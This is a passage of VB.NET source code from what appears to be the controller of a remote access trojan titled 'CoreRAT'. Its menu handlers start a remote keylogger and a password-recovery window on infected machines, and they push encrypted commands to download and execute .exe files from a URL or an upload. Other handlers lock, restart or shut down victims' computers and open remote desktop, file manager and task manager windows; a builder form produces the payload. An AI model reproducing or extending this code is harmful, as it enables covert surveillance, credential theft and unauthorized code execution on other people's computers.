        Thumbnails.AddThumbNail(client.IPAddress.ToString(), txt)
    End Sub


#End Region

#Region "Right Click"

    Private Sub RemoteKeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteKeyloggerToolStripMenuItem.Click
        Try
            Keylogger.connected = ListView1.SelectedItems.Item(0).Tag
            Keylogger.Text = "Keylogger - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            Keylogger.Show()
        Catch
        End Try
    End Sub

    Private Sub PasswordRecoveryToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        Try
            paswdrec.connected = ListView1.SelectedItems.Item(0).Tag
            paswdrec.Text = "Password Recovery - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            paswdrec.Show()
        Catch
        End Try
    End Sub


    Private Sub ViewThumbnailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ViewThumbnailsToolStripMenuItem.Click
        Try
            Thumbnails.Show()
        Catch
        End Try
    End Sub

#End Region

#Region "OnConnect"
    Private Sub OpenUrlToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenUrlToolStripMenuItem.Click
        Dim res As String = InputBox("Please enter an URL!", "Open Website")
        If res = "" Then
            Exit Sub
        Else
            With ListViewOnConnect.Items.Add("Open Website")
                .SubItems.Add(res)
                .SubItems.Add("Enabled")
            End With
        End If
    End Sub
    Private Sub DownloadExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadExecuteToolStripMenuItem.Click
        Dim res As String = InputBox("Please enter a direct Download Link to an .exe!", "Download & Execute")
        If res = "" Or Not res.Contains(".exe") Then
            Exit Sub
        Else
            With ListViewOnConnect.Items.Add("Download & Execute")
                .SubItems.Add(res)
                .SubItems.Add("Enabled")
            End With
        End If
    End Sub
    Private Sub RemoveActionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveActionToolStripMenuItem.Click
        Try
            ListViewOnConnect.Items.RemoveAt(ListViewOnConnect.SelectedItems.Item(0).Index)
        Catch
        End Try
    End Sub
    Private Sub DisableActionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisableActionToolStripMenuItem.Click
        Try
            If ListViewOnConnect.SelectedItems.Item(0).SubItems(2).Text = "Enabled" Then
                ListViewOnConnect.SelectedItems.Item(0).SubItems(2).Text = "Disabled"
            End If
        Catch
        End Try
    End Sub
    Private Sub EnableActionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnableActionToolStripMenuItem.Click
        Try
            If ListViewOnConnect.SelectedItems.Item(0).SubItems(2).Text = "Disabled" Then
                ListViewOnConnect.SelectedItems.Item(0).SubItems(2).Text = "Enabled"
            End If
        Catch
        End Try
    End Sub

#End Region

#Region "Server Options"


    Private Sub FromFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromFileToolStripMenuItem1.Click
        Try
            Using ofd As New OpenFileDialog
                With ofd
                    .Filter = "Executables | *.exe"
                    .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    .Multiselect = False
                    .Title = "Select a File..."
                    Dim res = .ShowDialog()

                    If res = Windows.Forms.DialogResult.OK Then
                        SendToSelected(New Encryption().AES_Encrypt("ExecutefromFile" & New Encryption().EncryptBase64(File.ReadAllBytes(ofd.FileName)), enckey))
                    End If
                End With
            End Using
        Catch
        End Try
    End Sub
    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim url As String = InputBox("Please enter a direct Link to a .exe", "Execute File from URL")
            If url = String.Empty Or Not Microsoft.VisualBasic.Right(url, 4) = ".exe" Then Exit Sub
            SendToSelected(New Encryption().AES_Encrypt("ExecuteFromLink" & url, enckey))
        Catch
        End Try
    End Sub
    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Try
            SendToSelected(New Encryption().AES_Encrypt("Restart", enckey))
        Catch
        End Try
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            SendToSelected(New Encryption().AES_Encrypt("Close", enckey))
        Catch
        End Try
    End Sub

    Private Sub OpenWebsiteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Try
            SendToSelected(New Encryption().AES_Encrypt("Website|" & InputBox("Please enter a Website to open!", "Open Website"), enckey))
        Catch
        End Try
    End Sub

    Private Sub ChangeWalpaperToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Try
            SendToSelected(New Encryption().AES_Encrypt("Change|" & InputBox("Please insert a direct link to a .jpg!", "Change Wallpaper"), enckey))
        Catch
        End Try
    End Sub

    Private Sub LockToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LockToolStripMenuItem.Click
        Try
            SendToSelected(New Encryption().AES_Encrypt("logout", enckey))
        Catch
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        Try
            SendToSelected(New Encryption().AES_Encrypt("restart", enckey))
        Catch
        End Try
    End Sub

    Private Sub ShutDownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutDownToolStripMenuItem.Click
        Try
            SendToSelected(New Encryption().AES_Encrypt("shutdown", enckey))
        Catch
        End Try
    End Sub

#End Region

#Region "port on-off"

    Private Sub ToolStripLabel1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripLabel1.Click
        port = NumericUpDown1.Value

        If ToolStripLabel1.Text = "Listen port" Then
            ToolStripLabel1.Text = "Port Closed"
            ToolStripButton1.Image = ImageList1.Images.Item(1)

            If listeningThread.IsAlive = True Then
                SendToAll(New Encryption().AES_Encrypt("Disconnected", enckey))
                listener.Server.Close()
                listeningThread.Abort()
                Invoke(New DelegateToggleListen(AddressOf ToggleListen), False)
                Invoke(New DelegateChangeText(AddressOf ChangeText), "Status: Idle...", Color.Black)
                ListView1.Items.Clear()
            End If

        Else
            ToolStripLabel1.Text = "Listen port"
            ToolStripButton1.Image = ImageList1.Images.Item(0)

            Try
                If listeningThread.IsAlive = True Then
                    MsgBox("You are already listening on this port!", MsgBoxStyle.Critical)
                    Exit Sub
                End If
1:              listeningThread = New Thread(AddressOf Listen)
                listeningThread.IsBackground = True
                listeningThread.Start()
                Invoke(New DelegateChangeText(AddressOf ChangeText), "Status: Listening...", Color.Green)
            Catch
                GoTo 1
            End Try
        End If
    End Sub

#End Region

#Region "Build"

    Private Sub ToolStripLabel2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripLabel2.Click

        frmBuild.Show()

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        My.Settings.autolistening = cb_autolistening.Checked
        My.Settings.ShowNotification = cb_ShowNotification.Checked
        My.Settings.PlaySound = cb_PlaySound.Checked


        My.Settings.port = NumericUpDown1.Value
        My.Settings.Save()
        MsgBox("Settings saved !", vbYes + vbInformation, "Saved!")

    End Sub

#End Region

#Region "Controls"
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        'form title
        Me.Text = "CoreRAT (" & ListView1.Items.Count & ") - " & port

    End Sub

    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick

        SystemInformationToolStripMenuItem.PerformClick()

    End Sub

    Private Sub InstalledSoftwareToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InstalledSoftwareToolStripMenuItem.Click
        'Installed Software
        Try
            FormSoftwareList.Text = "Installed Software - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            FormSoftwareList.connected = ListView1.SelectedItems.Item(0).Tag
            FormSoftwareList.Show()
        Catch
        End Try
    End Sub

    Private Sub TCPConnectionsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TCPConnectionsToolStripMenuItem.Click
        'TCP Connection
        Try
            FormTCPconn.Text = "TCP Connection - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            FormTCPconn.connected = ListView1.SelectedItems.Item(0).Tag
            FormTCPconn.Show()
        Catch
        End Try
    End Sub

    Private Sub StartupManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartupManagerToolStripMenuItem.Click
        'Startup Manager
        Try
            FormStartup.Text = "Startup Manager - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            FormStartup.connected = ListView1.SelectedItems.Item(0).Tag
            FormStartup.Show()
        Catch
        End Try
    End Sub


    Private Sub ToolStripLabel3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripLabel3.Click
        Try
            If ListView1.SelectedItems.Count Then
                SendToSelected(New Encryption().AES_Encrypt("Close", enckey))
            Else
                MsgBox("Please select one server first!")
            End If
        Catch
        End Try
    End Sub

    Private Sub FileManagerToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileManagerToolStripMenuItem1.Click
        'File Manager
        Try
            FormfileManager.Text = "File Manager - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            FormfileManager.connected = ListView1.SelectedItems.Item(0).Tag
            FormfileManager.Show()
        Catch
        End Try
    End Sub
    Private Sub PingToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PingToolStripMenuItem.Click
        Try
            Dim pingSender As Ping = New Ping()
            Dim reply As PingReply = pingSender.Send(ListView1.SelectedItems.Item(0).SubItems(1).Text, 3000)
            ListView1.SelectedItems.Item(0).SubItems(7).Text = reply.RoundtripTime & "/ms"
        Catch
        End Try
    End Sub
#End Region

    Private Sub ToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem1.Click
        Try
            FormProcess.Text = "Task Manager - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            FormProcess.connected = ListView1.SelectedItems.Item(0).Tag
            FormProcess.Show()
        Catch
        End Try
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteDesktopToolStripMenuItem1.Click
        Try
            RemoteDesktop.connected = ListView1.SelectedItems.Item(0).Tag
            RemoteDesktop.Text = "Remote Desktop - " & ListView1.SelectedItems.Item(0).SubItems(4).Text
            RemoteDesktop.Show()
        Catch
        End Try
    End Sub
End Class